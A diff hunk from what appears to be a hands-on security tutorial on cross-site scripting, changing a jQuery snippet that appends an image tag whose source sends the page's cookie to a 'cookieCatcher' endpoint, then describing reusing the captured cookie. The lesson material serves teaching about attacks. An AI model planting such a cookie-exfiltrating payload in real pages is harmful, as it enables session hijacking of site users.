@@ -103,7 +103,7 @@ steal their cookie!
   var img = $('<img>');
   // Read and submit this cookie via the img tag
   img.attr('src', "http://localhost:3000/cookieCatcher?cookie="))
-  $(document).append(img);
+  $('body').append(img);
   ```
 1. Note the value of the cookie in the command line. Use either
   the DevTools console or a Chrome Plugin to create the same cookie
